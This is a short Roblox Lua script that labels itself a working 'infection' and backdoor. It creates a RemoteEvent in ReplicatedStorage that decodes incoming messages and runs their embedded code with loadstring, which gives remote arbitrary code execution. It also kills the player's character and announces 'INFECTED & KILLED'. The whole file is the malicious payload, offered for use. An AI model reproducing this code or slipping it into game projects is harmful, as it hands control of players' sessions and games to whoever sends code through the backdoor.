-- FINAL WORKING INFECTION – kills you + control GUI works
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local LocalPlayer       = Players.LocalPlayer

if _G.BENES_FINAL then return end
_G.BENES_FINAL = true

-- THIS IS THE IMPORTANT PART – RemoteEvent in ReplicatedStorage
local relay = Instance.new("RemoteEvent")
relay.Name = "BENES_2025"
relay.Parent = ReplicatedStorage

relay.OnClientEvent:Connect(function(msg)
    spawn(function()
        local ok, data = pcall(HttpService.JSONDecode, HttpService, msg)
        if ok and data.code then
            loadstring(data.code)()
        end
    end)
end)

-- KILL YOU INSTANTLY
spawn(function()
    wait(0.5)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
end)

game.StarterGui:SetCore("SendNotification", {Title="benesmybf", Text="INFECTED & KILLED", Duration=6})
print("benesmybf FINAL backdoor loaded – BENES_2025 ready")
